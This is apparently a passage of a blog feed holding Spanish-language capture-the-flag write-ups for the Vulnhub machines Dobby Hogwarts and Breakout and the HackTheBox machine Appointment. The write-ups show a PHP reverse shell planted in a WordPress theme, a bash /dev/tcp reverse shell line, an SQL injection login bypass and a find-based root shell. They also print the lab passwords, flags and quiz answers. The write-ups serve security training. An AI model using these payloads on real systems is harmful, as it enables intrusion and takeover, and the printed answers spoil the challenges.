<p><img src="http://localhost:4000/assets/images/vulnhub/odin1/40.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><category term="video" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Odin 1.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[<p><a href="https://www.vulnhub.com/entry/hogwarts-dobby,597/">https://www.vulnhub.com/entry/hogwarts-dobby,597/</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá una IP con el puerto 80 abierto</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/2.png" alt="image-center" class="align-center" /></p>

<p>Abrir navegador e ir a la IP, en este caso</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.1.82
</code></pre></div></div>

<p>Se abrirá una web por defecto de apache</p>

<p>Hacemos click derecho e inspeccionar elemento</p>

<p>Abajo del todo veremos una pista que nos dice que miremos en /alohomora así que ponemos</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/alohomora
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/3.png" alt="image-center" class="align-center" /></p>

<p>Nos dirá que la clave de Draco es su casa (slytherin)</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/4.png" alt="image-center" class="align-center" /></p>

<p>Ahora hacemos un gobuster para ver qué más directorios existen</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster  <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.23 <span class="nt">-P</span> 80 <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt
</code></pre></div></div>

<p>Nos saldrán más directorios, entre ellos uno llamado log</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/5.png" alt="image-center" class="align-center" /></p>

<p>Accedemos a el así</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/log
</code></pre></div></div>

<p>Nos dará una contraseña y nos dirá que miremos en /DiagonAlley</p>

<p>La contraseña está cifrada en base64, la desciframos y saldrá algo así</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/6.png" alt="image-center" class="align-center" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ilikesocks
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/7.png" alt="image-center" class="align-center" /></p>

<p>Vamos a DiagonAlley así</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/DiagonAlley
</code></pre></div></div>

<p>Veremos una web con dos artículos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/8.png" alt="image-center" class="align-center" /></p>

<p>El primer artículo tendrá un código cifrado, lo podemos descifrar en decode.fr/cipher-identifier</p>

<p>Ahora hacemos de nuevo un gobuster pero bajo ese directorio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster  <span class="nb">dir</span> <span class="nt">-u</span> 192.168.122.23/DiagonAlley
</code></pre></div></div>

<p>Nos mostrará que hay varios directorios y archivos de wordpress, entre ellos uno llamado wp-admin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/9.png" alt="image-center" class="align-center" /></p>

<p>Accedemos a él así</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.122.23/DiagonAlley/wp-admin
</code></pre></div></div>

<p>Nos saldrá una página de inicio de sesión</p>

<p>Colocamos de nombre Draco y de contraseña slytherin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/10.png" alt="image-center" class="align-center" /></p>

<p>Copiar php-reverse-shell.php de /usr/share/webshells/php a Documentos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/11.png" alt="image-center" class="align-center" /></p>

<p>Cambiar el propietario del archivo con chown para poder editarlo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/12.png" alt="image-center" class="align-center" /></p>

<p>Editarlo con nano para que lo IP sea la de nuestro equipo y el puerto que queramos poner como escucha</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/13.png" alt="image-center" class="align-center" /></p>

<p>Copiar todo el código e ir a la web de wordpress con el usuario de Draco</p>

<p>Ir a Apariencia -&gt; editor de temas</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/14.png" alt="image-center" class="align-center" /></p>

<p>Seleccionar de la lista el de error 404</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/15.png" alt="image-center" class="align-center" /></p>

<p>Pegar el código y aplicar cambios</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/16.png" alt="image-center" class="align-center" /></p>

<p>Usar el comando nc para escuchar desde ese puerto</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 4444
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/17.png" alt="image-center" class="align-center" /></p>

<p>Ingresar un enlace inválido en wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/18.png" alt="image-center" class="align-center" /></p>

<p>Se abrirá el acceso a la Shell del equipo que tiene wordpress</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/19.png" alt="image-center" class="align-center" /></p>

<p>Ejecutar el comando</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="nb">.</span> <span class="nt">-exec</span> /bin/bash <span class="nt">-p</span> <span class="se">\;</span> <span class="nt">-quit</span>
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/20.png" alt="image-center" class="align-center" /></p>

<p>Nos dará acceso al bash en lugar de sh y con el usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/21.png" alt="image-center" class="align-center" /></p>

<p>Cambiamos al usuario dobby con la contraseña que encontramos antes (ilikesocks)</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/22.png" alt="image-center" class="align-center" /></p>

<p>Vamos al directorio /home/dobby y usamos el comando base32 al archivo flag1.txt para poder leer archivos dado que cat no funciona</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/23.png" alt="image-center" class="align-center" /></p>

<p>Usamos la web dcode.fr/identification-chiffrement para saber que cifrado está utilizando y nos saldrá que es base32</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/24.png" alt="image-center" class="align-center" /></p>

<p>Lo pasamos por un descifrador de base32</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/25.png" alt="image-center" class="align-center" /></p>

<p>Y saldrá otra flag nueva, repetimos el proceso de detectar que cifrado usa</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/26.png" alt="image-center" class="align-center" /></p>

<p>Y nos dirá ques cifrado md5, lo desciframos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/27.png" alt="image-center" class="align-center" /></p>

<p>Nos saldrá un mensaje que dice goodjob</p>

<p>Esto, no sirve para nada realmente</p>

<p>Ahora miramos el directorio del usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/28.png" alt="image-center" class="align-center" /></p>

<p>Y leemos el archivo llamado proof.txt</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/dobby_hogwarts/29.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Dobby hogwarts.]]></summary></entry><entry><title type="html">Appointment</title><link href="http://localhost:4000/hackthebox/appointment/" rel="alternate" type="text/html" title="Appointment" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox/appointment</id><content type="html" xml:base="http://localhost:4000/hackthebox/appointment/"><![CDATA[<h1 id="preguntas">Preguntas</h1>

<p><strong>What does the acronym SQL stand for?</strong></p>

<p>Structured Query Language</p>

<p><strong>What is one of the most common type of SQL vulnerabilities?</strong></p>

<p>SQL injection</p>

<p><strong>What does PII stand for?</strong></p>

<p>Personally Identifiable Information</p>

<p><strong>What does the OWASP Top 10 list name the classification for this vulnerability?</strong></p>

<p>A03:2021-Injection</p>

<p><strong>What service and version are running on port 80 of the target?</strong></p>

<p>Apache httpd 2.4.38 ((Debian))</p>

<p><strong>What is the standard port used for the HTTPS protocol?</strong></p>

<p>443</p>

<p><strong>What is one luck-based method of exploiting login pages?</strong></p>

<p>brute-forcing</p>

<p><strong>What is a folder called in web-application terminology?</strong></p>

<p>directory</p>

<p><strong>What response code is given for “Not Found” errors?</strong></p>

<p>404</p>

<p><strong>What switch do we use with Gobuster to specify we’re looking to discover directories, and not subdomains?</strong></p>

<p>dir</p>

<p><strong>What symbol do we use to comment out parts of the code?</strong></p>

<p>#</p>

<h1 id="proceso">Proceso</h1>

<p>Entrar al sitio web desde el navegador poniendo la ip, aparecerá un login</p>

<p><img src="http://localhost:4000/assets/images/htb/appointment/1.png" alt="image-center" class="align-center" /></p>

<p>Tratar de entrar mediante inyección de SQL del siguiente modo</p>

<p>Usuario= admin</p>

<p>Contraseña= wrongpassword’ OR ‘1’=’1</p>

<p><img src="http://localhost:4000/assets/images/htb/appointment/2.png" alt="image-center" class="align-center" /></p>

<p>Dará acceso mostrando un mensaje con el flag</p>

<p><img src="http://localhost:4000/assets/images/htb/appointment/3.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry><entry><title type="html">Breakout</title><link href="http://localhost:4000/vulnhub/breakout/" rel="alternate" type="text/html" title="Breakout" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/breakout</id><content type="html" xml:base="http://localhost:4000/vulnhub/breakout/"><![CDATA[<p><a href="https://www.vulnhub.com/series/empire,507/">https://www.vulnhub.com/series/empire,507/</a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.0/24
</code></pre></div></div>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/1.png" alt="image-center" class="align-center" /></p>

<p>Saldrá la máquina breakout</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/2.png" alt="image-center" class="align-center" /></p>

<p>Entrar al servidor web con la dirección <code class="language-plaintext highlighter-rouge">192.168.1.146</code>, saldrá la web por defecto de Apache</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/3.png" alt="image-center" class="align-center" /></p>

<p>Dar click derecho e inspeccionar elemento y saldrá un mensaje encriptado</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/4.png" alt="image-center" class="align-center" /></p>

<p>Usar el identificador de cifrado de la web decode.fr, dirá que es cifrado Brainfuck</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/5.png" alt="image-center" class="align-center" /></p>

<p>Usar el descifrador Brainfuck</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/6.png" alt="image-center" class="align-center" /></p>

<p>Tratar de intentar entrar al servidor web con otro de los puertos abiertos, en este caso el 20000</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/7.png" alt="image-center" class="align-center" /></p>

<p>Dirá que es un servidor bajo SSL por lo que recomienda acceder con https en lugar de http, cambiamos y saldrá la advertencia de sitio inseguro</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/8.png" alt="image-center" class="align-center" /></p>

<p>Pulsar en avanzado y en aceptar el riesgo y continuar</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/9.png" alt="image-center" class="align-center" /></p>

<p>Saldrá un login para Usermin</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/10.png" alt="image-center" class="align-center" /></p>

<p>Usar enum4linux para descubrir el usuario que se encuentra en el equipo</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/11.png" alt="image-center" class="align-center" /></p>

<p>Saldrá el usuario cyber</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/12.png" alt="image-center" class="align-center" /></p>

<p>Usar el usuario cyber y la contraseña descifrada anteriormente</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/13.png" alt="image-center" class="align-center" /></p>

<p>Cargará el siguiente panel</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/14.png" alt="image-center" class="align-center" /></p>

<p>En la parte inferior se encontrarán unos botones, uno de ellos permitirá abrir una shell</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/15.png" alt="image-center" class="align-center" /></p>

<p>Entrará al directorio personal de cyber y con dicho usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/16.png" alt="image-center" class="align-center" /></p>

<p>Listar el contenido, mostrará un archivo llamado <code class="language-plaintext highlighter-rouge">user.txt</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/17.png" alt="image-center" class="align-center" /></p>

<p>Mostrará el flag del usuario</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/18.png" alt="image-center" class="align-center" /></p>

<p>Usar el comando <code class="language-plaintext highlighter-rouge">getcap</code> con el archivo tar</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/19.png" alt="image-center" class="align-center" /></p>

<p>Ir a <code class="language-plaintext highlighter-rouge">/var/backups</code> y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/20.png" alt="image-center" class="align-center" /></p>

<p>Volver al home de cyber y usar el archivo tar para comprimir el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/21.png" alt="image-center" class="align-center" /></p>

<p>Descomprimir el archivo creado</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/22.png" alt="image-center" class="align-center" /></p>

<p>Se creará un directorio llamado var, dentro de él otro llamado backups y dentro de este estará el archivo <code class="language-plaintext highlighter-rouge">.old_pass.bak</code> que ahora se podrá leer</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/23.png" alt="image-center" class="align-center" /></p>

<p>Mostrará una contraseña para el usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/24.png" alt="image-center" class="align-center" /></p>

<p>Al tratar de usar el comando su no lo permitirá</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/25.png" alt="image-center" class="align-center" /></p>

<p>Hacer un reverse shell con el comando</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash –i  <span class="o">&gt;</span>&amp; /dev/tcp/192.168.1.127/4444 0&gt;&amp;1
</code></pre></div></div>

<p>Y poner el puerto de escucha en 4444</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/26.png" alt="image-center" class="align-center" /></p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/27.png" alt="image-center" class="align-center" /></p>

<p>Se abrirá un shell inverso aunque aún con el usuario cyber</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/28.png" alt="image-center" class="align-center" /></p>

<p>Hacer de nuevo un cat al archivo para poder copiar la contraseña</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/29.png" alt="image-center" class="align-center" /></p>

<p>Cambiar de usuario con su, cambiará al usuario root aunque sin mostrar texto, de todos modos se pueden escribir comandos</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/30.png" alt="image-center" class="align-center" /></p>

<p>Ir al directorio de root y mostrar el contenido</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/31.png" alt="image-center" class="align-center" /></p>

<p>Mostrará el flag del usuario root</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/32.png" alt="image-center" class="align-center" /></p>

<h2 id="usuarios-y-contraseñas">Usuarios y contraseñas</h2>

<p>Cyber= .2uqPEfj3D&lt;P’a-3
Root= Ts&amp;4&amp;YurgtRX(=~h</p>

<h2 id="flags">Flags</h2>

<p>Usuario:  3mp!r3{You_Manage_To_Break_To_My_Secure_Access}</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/33.png" alt="image-center" class="align-center" /></p>

<p>Root: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}</p>

<p><img src="http://localhost:4000/assets/images/vulnhub/breakout/34.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Breakout.]]></summary></entry></feed>